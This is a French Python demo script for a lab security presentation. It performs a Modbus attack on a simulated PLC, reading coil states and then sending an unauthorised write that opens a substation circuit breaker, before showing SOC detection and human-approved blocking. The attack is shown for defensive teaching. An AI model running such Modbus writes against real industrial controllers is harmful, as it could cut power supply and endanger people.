#!/usr/bin/env python3
"""
demo_ceet.py — Lanceur de démonstration guidée : attaque SCADA CEET
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Déroule LE scénario fort de la démo devant un jury, avec narration et
pauses (tu appuies sur Entrée pour passer à l'étape suivante). À lancer
depuis la machine attaquante (Kali), contre l'automate simulé.

    python3 demo_ceet.py --target 192.168.10.50

Prérequis :
  - plc_simulator.py tourne sur la cible (192.168.10.50:502)
  - Suricata surveille le réseau avec rules/soc-ics.rules
  - l'automate est déclaré 'critique' dans soc-automation/assets.yml
  - le SOC (surveillance_soc + telegram_bot) est démarré

Aucune dépendance externe (réutilise attaque_modbus.py).
"""

import argparse
import socket
import struct
import sys
import time

# Réutilise les primitives Modbus du script d'attaque
try:
    from attaque_modbus import read_coils, write_coil
except ImportError:
    print("❌ Lance ce script depuis le dossier ot-lab/ (à côté de attaque_modbus.py)")
    sys.exit(1)

# ── Couleurs terminal (pour la lisibilité en démo) ──
R, G, Y, B, C, W, X = ("\033[31m", "\033[32m", "\033[33m", "\033[34m",
                       "\033[36m", "\033[1m", "\033[0m")


def banner(txt, color=C):
    print(f"\n{color}{W}{'═'*64}{X}")
    print(f"{color}{W}  {txt}{X}")
    print(f"{color}{W}{'═'*64}{X}\n")


def say(txt):
    print(f"{W}🎤 {txt}{X}")


def pause(prompt="⏎  Appuie sur Entrée pour continuer..."):
    try:
        input(f"\n{Y}{prompt}{X}")
    except (EOFError, KeyboardInterrupt):
        print("\nDémo interrompue.")
        sys.exit(0)


def main():
    ap = argparse.ArgumentParser(description="Démo guidée attaque SCADA CEET")
    ap.add_argument("--target", required=True, help="IP de l'automate CEET simulé")
    ap.add_argument("--port", type=int, default=502)
    ap.add_argument("--unit", type=int, default=1)
    ap.add_argument("--coil", type=int, default=0, help="disjoncteur ciblé")
    args = ap.parse_args()

    banner("DÉMONSTRATION — ATTAQUE SUR INFRASTRUCTURE ÉNERGÉTIQUE (CEET)", C)
    say("Contexte : un automate (PLC) pilote les disjoncteurs d'un poste")
    say("électrique de la CEET. Il parle Modbus — un protocole SANS")
    say("authentification. Voyons ce qui se passe si un attaquant y accède.")
    pause()

    # ── Connexion ──
    try:
        sock = socket.create_connection((args.target, args.port), timeout=5)
    except OSError as e:
        print(f"{R}❌ Connexion impossible à {args.target}:{args.port} — {e}{X}")
        print(f"{Y}   Vérifie que plc_simulator.py tourne sur la cible.{X}")
        sys.exit(1)

    try:
        # ── Étape 1 : reconnaissance ──
        banner("ÉTAPE 1/3 — RECONNAISSANCE", B)
        say("L'attaquant lit l'état des disjoncteurs du poste (lecture Modbus).")
        print(f"{C}   → lecture des bobines (coils 0-2)...{X}")
        read_coils(sock, args.unit, 0, 3)
        say("Il voit que les disjoncteurs sont FERMÉS (le courant passe).")
        pause()

        # ── Étape 2 : l'attaque ──
        banner("ÉTAPE 2/3 — ATTAQUE : OUVERTURE D'UN DISJONCTEUR", R)
        say("L'attaquant envoie une commande Modbus d'ÉCRITURE non autorisée")
        say(f"pour OUVRIR le disjoncteur {args.coil} → couper l'alimentation.")
        print(f"{R}   → écriture Modbus (function code 0x05)...{X}")
        write_coil(sock, args.unit, args.coil, on=False)
        say("Commande envoyée. Sur un vrai réseau, le courant serait coupé.")
        print(f"\n{Y}{W}👉 REGARDE TON TÉLÉPHONE : le SOC vient de réagir.{X}")
        pause()

        # ── Étape 3 : la réponse du SOC ──
        banner("ÉTAPE 3/3 — RÉPONSE DU SOC (le point clé)", G)
        say("Suricata a détecté l'écriture Modbus → le SOC l'a classée")
        say("ICS_ATTACK. L'automate est un équipement CRITIQUE.")
        print()
        say("⚠️  Un SOC classique aurait bloqué AUTOMATIQUEMENT l'IP...")
        say("    ...et coupé le réseau de l'automate = BLACKOUT possible.")
        print()
        say(f"{G}Le nôtre NE bloque PAS tout seul.{X} Il envoie une demande de")
        say("validation sur Telegram : ✅ Bloquer  /  ❌ Ignorer.")
        say("Parce que sur une infrastructure critique, la DISPONIBILITÉ prime.")
        print()
        print(f"{C}   Sur Telegram → clique {G}✅ Bloquer l'attaquant{C} :{X}")
        print(f"{C}   • l'IP est bloquée (local + Wazuh Active Response)")
        print(f"{C}   • un case TheHive est créé et assigné à un analyste")
        print(f"{C}   • la décision est tracée (qui, quand){X}")
        pause("⏎  Une fois la décision prise sur Telegram, Entrée pour vérifier...")

        # ── Vérification finale ──
        banner("VÉRIFICATION — ÉTAT DE L'AUTOMATE", C)
        say("Relecture de l'état des disjoncteurs :")
        read_coils(sock, args.unit, 0, 3)
        print()
        say(f"{G}{W}Résumé : attaque industrielle détectée, analysée, et")
        say(f"neutralisée SANS interrompre le service — l'humain a tranché.{X}")
        banner("FIN DE LA DÉMONSTRATION", G)

    finally:
        sock.close()


if __name__ == "__main__":
    main()
